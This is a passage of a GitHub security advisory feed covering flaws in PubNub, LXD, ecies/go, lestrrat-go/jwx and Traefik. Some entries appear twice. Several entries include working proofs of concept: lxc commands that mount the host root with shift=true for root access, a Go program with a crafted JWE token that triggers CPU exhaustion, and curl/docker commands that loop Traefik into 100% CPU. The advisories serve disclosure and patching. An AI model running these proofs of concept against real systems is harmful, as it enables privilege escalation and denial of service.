        <content type="html"><![CDATA[<p>Versions of the package pubnub before 7.4.0; all versions of the package com.pubnub:pubnub; versions of the package pubnub before 6.19.0; all versions of the package github.com/pubnub/go; versions of the package github.com/pubnub/go/v7 before 7.2.0; versions of the package pubnub before 7.3.0; versions of the package pubnub/pubnub before 6.1.0; versions of the package pubnub before 5.3.0; versions of the package pubnub before 0.4.0; versions of the package pubnub/c-core before 4.5.0; versions of the package com.pubnub:pubnub-kotlin before 7.7.0; versions of the package pubnub/swift before 6.2.0; versions of the package pubnub before 5.2.0; versions of the package pubnub before 4.3.0 are vulnerable to Insufficient Entropy via the getKey function, due to inefficient implementation of the AES-256-CBC cryptographic algorithm. The provided encrypt function is less secure when hex encoding and trimming are applied, leaving half of the bits in the key always the same for every encoded message or file.</p>
<p><strong>Note:</strong></p>
<p>In order to exploit this vulnerability, the attacker needs to invest resources in preparing the attack and brute-force the encryption.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-26154">https://nvd.nist.gov/vuln/detail/CVE-2023-26154</a></li>
<li><a href="https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119">https://github.com/pubnub/javascript/commit/fb6cd0417cbb4ba87ea2d5d86a9c94774447e119</a></li>
<li><a href="https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0">https://gist.github.com/vargad/20237094fce7a0a28f0723d7ce395bb0</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384">https://security.snyk.io/vuln/SNYK-COCOAPODS-PUBNUB-6098384</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372">https://security.snyk.io/vuln/SNYK-DOTNET-PUBNUB-6098372</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGO-6098373</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374">https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMPUBNUBGOV7-6098374</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098371</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380">https://security.snyk.io/vuln/SNYK-JAVA-COMPUBNUB-6098380</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690">https://security.snyk.io/vuln/SNYK-JS-PUBNUB-5840690</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376">https://security.snyk.io/vuln/SNYK-PHP-PUBNUBPUBNUB-6098376</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385">https://security.snyk.io/vuln/SNYK-PUB-PUBNUB-6098385</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375">https://security.snyk.io/vuln/SNYK-PYTHON-PUBNUB-6098375</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377">https://security.snyk.io/vuln/SNYK-RUBY-PUBNUB-6098377</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378">https://security.snyk.io/vuln/SNYK-RUST-PUBNUB-6098378</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381">https://security.snyk.io/vuln/SNYK-SWIFT-PUBNUBSWIFT-6098381</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379">https://security.snyk.io/vuln/SNYK-UNMANAGED-PUBNUBCCORE-6098379</a></li>
<li><a href="https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70">https://github.com/pubnub/javascript/blob/master/src/crypto/modules/web.js#L70</a></li>
<li><a href="https://github.com/advisories/GHSA-5844-q3fc-56rh">https://github.com/advisories/GHSA-5844-q3fc-56rh</a></li>
<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/pubnub/CVE-2023-26154.yml</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5844-q3fc-56rh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-06T06:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/canonical/lxd] Canonical LXD documentation improvement to make clear restricted.devices.disk=allow without restricted.devices.disk.paths also allows shift=true]]></title>
        <id>https://github.com/advisories/GHSA-x9qq-236j-gj97</id>
        <link href="https://github.com/advisories/GHSA-x9qq-236j-gj97"/>
        <updated>2023-12-05T23:32:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If a user has restricted access to a project that is configured with <code>restricted=true</code>, they can gain root access on the system by creating a disk device with <code>shift=true</code> and creating a setuid root executable. This is possible because the <code>shift</code> property is not restricted unless <code>restricted.devices.disk.paths</code> is set.</p>
<h3 id="details">Details</h3>
<p>The following patch shows the offending code with a possible fix:</p>
<pre><code class="language-patch">--- a/lxd/device/disk.go
+++ b/lxd/device/disk.go
@@ -429,17 +429,19 @@ func (d *disk) validateEnvironmentSourcePath() error {
        if instProject.Name != api.ProjectDefaultName {
                // If restricted disk paths are in force, then check the disk's source is allowed, and record the
                // allowed parent path for later user during device start up sequence.
-               if shared.IsTrue(instProject.Config["restricted"]) &amp;&amp; instProject.Config["restricted.devices.disk.paths"] != "" {
-                       allowed, restrictedParentSourcePath := project.CheckRestrictedDevicesDiskPaths(instProject.Config, d.config["source"])
-                       if !allowed {
-                               return fmt.Errorf("Disk source path %q not allowed by project for disk %q", d.config["source"], d.name)
+               if shared.IsTrue(instProject.Config["restricted"]) {
+                       if instProject.Config["restricted.devices.disk.paths"] != "" {
+                               allowed, restrictedParentSourcePath := project.CheckRestrictedDevicesDiskPaths(instProject.Config, d.config["source"])
+                               if !allowed {
+                                       return fmt.Errorf("Disk source path %q not allowed by project for disk %q", d.config["source"], d.name)
+                               }
+
+                               d.restrictedParentSourcePath = shared.HostPath(restrictedParentSourcePath)
                        }

                        if shared.IsTrue(d.config["shift"]) {
                                return fmt.Errorf(`The "shift" property cannot be used with a restricted source path`)
                        }
-
-                       d.restrictedParentSourcePath = shared.HostPath(restrictedParentSourcePath)
                }
        }
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">$ lxc project create restricted -c restricted=true -c restricted.devices.disk=allow
$ lxc project switch restricted
$ lxc profile device add default root disk path=/ pool=default
$ lxc init ubuntu:22.04 c1
$ lxc config device add c1 d1 disk source=/ path=/mnt shift=true
$ lxc start c1  # no error

$ lxc project set restricted restricted.devices.disk.paths=/  # explicitly allow mounting /
$ lxc restart c1
Error: Failed to start device "d1": The "shift" property cannot be used with a restricted source path
</code></pre>
<p>Created <a href="https://github.com/canonical/lxd/issues/12606">https://github.com/canonical/lxd/issues/12606</a> to improve the documentation as per <a href="https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97#advisory-comment-91918">https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97#advisory-comment-91918</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97">https://github.com/canonical/lxd/security/advisories/GHSA-x9qq-236j-gj97</a></li>
<li><a href="https://github.com/canonical/lxd/issues/12606">https://github.com/canonical/lxd/issues/12606</a></li>
<li><a href="https://github.com/advisories/GHSA-x9qq-236j-gj97">https://github.com/advisories/GHSA-x9qq-236j-gj97</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x9qq-236j-gj97</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-12-05T23:32:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ecies/go/v2] github.com/ecies/go vulnerable to possible private key restoration]]></title>
        <id>https://github.com/advisories/GHSA-8j98-cjfr-qx3h</id>
        <link href="https://github.com/advisories/GHSA-8j98-cjfr-qx3h"/>
        <updated>2023-12-05T23:30:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If functions <code>Encapsulate()</code>, <code>Decapsulate()</code> and <code>ECDH()</code> could be called by an attacker, he could recover any private key that he interacts with.</p>
<h3 id="patches">Patches</h3>
<p>Patched in v2.0.8</p>
<h3 id="workarounds">Workarounds</h3>
<p>You could manually check public key by calling <code>IsOnCurve()</code> function from secp256k1 libraries.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md">https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/ecies/go/security/advisories/GHSA-8j98-cjfr-qx3h">https://github.com/ecies/go/security/advisories/GHSA-8j98-cjfr-qx3h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49292">https://nvd.nist.gov/vuln/detail/CVE-2023-49292</a></li>
<li><a href="https://github.com/ecies/go/commit/c6e775163866d6ea5233eb8ec8530a9122101ebd">https://github.com/ecies/go/commit/c6e775163866d6ea5233eb8ec8530a9122101ebd</a></li>
<li><a href="https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md">https://github.com/ashutosh1206/Crypton/blob/master/Diffie-Hellman-Key-Exchange/Attack-Invalid-Curve-Point/README.md</a></li>
<li><a href="https://github.com/ecies/go/releases/tag/v2.0.8">https://github.com/ecies/go/releases/tag/v2.0.8</a></li>
<li><a href="https://github.com/advisories/GHSA-8j98-cjfr-qx3h">https://github.com/advisories/GHSA-8j98-cjfr-qx3h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8j98-cjfr-qx3h</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-05T23:30:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx/jwe] lestrrat-go/jwx's malicious parameters in JWE can cause a DOS]]></title>
        <id>https://github.com/advisories/GHSA-7f9x-gw85-8grf</id>
        <link href="https://github.com/advisories/GHSA-7f9x-gw85-8grf"/>
        <updated>2023-12-05T23:29:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>too high p2c parameter in JWE's alg PBES2-* could lead to a DOS attack</p>
<h3 id="details">Details</h3>
<p>The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.
Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-go">package main

import (
    "fmt"
    "github.com/lestrrat-go/jwx/v2/jwa"
    "github.com/lestrrat-go/jwx/v2/jwe"
    "github.com/lestrrat-go/jwx/v2/jwk"
)

func main() {
    token := []byte("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA")
    key, err := jwk.FromRaw([]byte(`abcdefg`))
    payload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))
    if err == nil {
        fmt.Println(string(payload))
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49290">https://nvd.nist.gov/vuln/detail/CVE-2023-49290</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c">https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c</a></li>
<li><a href="https://github.com/advisories/GHSA-7f9x-gw85-8grf">https://github.com/advisories/GHSA-7f9x-gw85-8grf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f9x-gw85-8grf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-05T23:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx/v2/jwe] lestrrat-go/jwx's malicious parameters in JWE can cause a DOS]]></title>
        <id>https://github.com/advisories/GHSA-7f9x-gw85-8grf</id>
        <link href="https://github.com/advisories/GHSA-7f9x-gw85-8grf"/>
        <updated>2023-12-05T23:29:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>too high p2c parameter in JWE's alg PBES2-* could lead to a DOS attack</p>
<h3 id="details">Details</h3>
<p>The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.
Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-go">package main

import (
    "fmt"
    "github.com/lestrrat-go/jwx/v2/jwa"
    "github.com/lestrrat-go/jwx/v2/jwe"
    "github.com/lestrrat-go/jwx/v2/jwk"
)

func main() {
    token := []byte("eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMjU2R0NNIiwicDJjIjoyMDAwMDAwMDAwLCJwMnMiOiJNNzczSnlmV2xlX2FsSXNrc0NOTU9BIn0=.S8B1kXdIR7BM6i_TaGsgqEOxU-1Sgdakp4mHq7UVhn-_REzOiGz2gg.gU_LfzhBXtQdwYjh.9QUIS-RWkLc.m9TudmzUoCzDhHsGGfzmCA")
    key, err := jwk.FromRaw([]byte(`abcdefg`))
    payload, err := jwe.Decrypt(token, jwe.WithKey(jwa.PBES2_HS256_A128KW, key))
    if err == nil {
        fmt.Println(string(payload))
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>It's a kind of Dos attack, the user's environment could potentially utilize an excessive amount of CPU resources.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-7f9x-gw85-8grf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49290">https://nvd.nist.gov/vuln/detail/CVE-2023-49290</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c">https://github.com/lestrrat-go/jwx/commit/64f2a229b8e18605f47361d292b526bdc4aee01c</a></li>
<li><a href="https://github.com/advisories/GHSA-7f9x-gw85-8grf">https://github.com/advisories/GHSA-7f9x-gw85-8grf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7f9x-gw85-8grf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-12-05T23:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik/v3] Traefik docker container using 100% CPU]]></title>
        <id>https://github.com/advisories/GHSA-6fwg-jrfw-ff7p</id>
        <link href="https://github.com/advisories/GHSA-6fwg-jrfw-ff7p"/>
        <updated>2023-12-05T18:13:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The traefik docker container uses 100% CPU when it serves as its own backend, which is an automatically generated route resulting from the Docker integration in the default configuration.</p>
<h3 id="details">Details</h3>
<p>While attempting to set up Traefik to handle traffic for Docker containers, I observed in the webUI a rule with the following information:</p>
<p><code>Host(traefik-service) | webwebsecure | traefik-service@docker | traefik-service</code></p>
<p>I assumed that this is something internal; however, I wondered why it would have a host rule on the web entrypoint configured.</p>
<p>So I have send a request with that hostname with <code>curl -v --resolve "traefik-service:80:xxx.xxx.xxx.xxx" http://traefik-service</code>. That made my whole server unresponsive.</p>
<p>I assume the name comes from a docker container with that name, traefik itself:</p>
<pre><code>localhost ~ # docker ps
CONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES
d1414e74aec7   traefik:v2.10                                           "/entrypoint.sh trae…"   4 minutes ago       Up 4 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp, :::443-&gt;443/tcp, 127.0.0.1:8080-&gt;8080/tcp   traefik.service
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Start traefik with <code>docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -p 80:80 --name foo -p 8080:8080 traefik:v2.10 --api.insecure=true --providers.docker</code></p>
</li>
<li><p><code>curl -v --resolve "foo:80:127.0.0.1" http://foo</code></p>
</li>
</ol>
<p>looks like this creates an endless loop of request.</p>
<p>Knowing the name of the docker container seems to be enough to trigger this, if the docker backend is used.</p>
<h3 id="impact">Impact</h3>
<p>Server is unreachable and uses 100% CPU</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p">https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47633">https://nvd.nist.gov/vuln/detail/CVE-2023-47633</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.10.6">https://github.com/traefik/traefik/releases/tag/v2.10.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5">https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5</a></li>
<li><a href="https://github.com/advisories/GHSA-6fwg-jrfw-ff7p">https://github.com/advisories/GHSA-6fwg-jrfw-ff7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fwg-jrfw-ff7p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-05T18:13:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/traefik/traefik/v2] Traefik docker container using 100% CPU]]></title>
        <id>https://github.com/advisories/GHSA-6fwg-jrfw-ff7p</id>
        <link href="https://github.com/advisories/GHSA-6fwg-jrfw-ff7p"/>
        <updated>2023-12-05T18:13:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The traefik docker container uses 100% CPU when it serves as its own backend, which is an automatically generated route resulting from the Docker integration in the default configuration.</p>
<h3 id="details">Details</h3>
<p>While attempting to set up Traefik to handle traffic for Docker containers, I observed in the webUI a rule with the following information:</p>
<p><code>Host(traefik-service) | webwebsecure | traefik-service@docker | traefik-service</code></p>
<p>I assumed that this is something internal; however, I wondered why it would have a host rule on the web entrypoint configured.</p>
<p>So I have send a request with that hostname with <code>curl -v --resolve "traefik-service:80:xxx.xxx.xxx.xxx" http://traefik-service</code>. That made my whole server unresponsive.</p>
<p>I assume the name comes from a docker container with that name, traefik itself:</p>
<pre><code>localhost ~ # docker ps
CONTAINER ID   IMAGE                                                   COMMAND                  CREATED             STATUS         PORTS                                                                                                NAMES
d1414e74aec7   traefik:v2.10                                           "/entrypoint.sh trae…"   4 minutes ago       Up 4 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp, 0.0.0.0:443-&gt;443/tcp, :::443-&gt;443/tcp, 127.0.0.1:8080-&gt;8080/tcp   traefik.service
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li><p>Start traefik with <code>docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -p 80:80 --name foo -p 8080:8080 traefik:v2.10 --api.insecure=true --providers.docker</code></p>
</li>
<li><p><code>curl -v --resolve "foo:80:127.0.0.1" http://foo</code></p>
</li>
</ol>
<p>looks like this creates an endless loop of request.</p>
<p>Knowing the name of the docker container seems to be enough to trigger this, if the docker backend is used.</p>
<h3 id="impact">Impact</h3>
<p>Server is unreachable and uses 100% CPU</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p">https://github.com/traefik/traefik/security/advisories/GHSA-6fwg-jrfw-ff7p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47633">https://nvd.nist.gov/vuln/detail/CVE-2023-47633</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v2.10.6">https://github.com/traefik/traefik/releases/tag/v2.10.6</a></li>
<li><a href="https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5">https://github.com/traefik/traefik/releases/tag/v3.0.0-beta5</a></li>
<li><a href="https://github.com/advisories/GHSA-6fwg-jrfw-ff7p">https://github.com/advisories/GHSA-6fwg-jrfw-ff7p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fwg-jrfw-ff7p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-12-05T18:13:53.000Z</published>
    </entry>
</feed>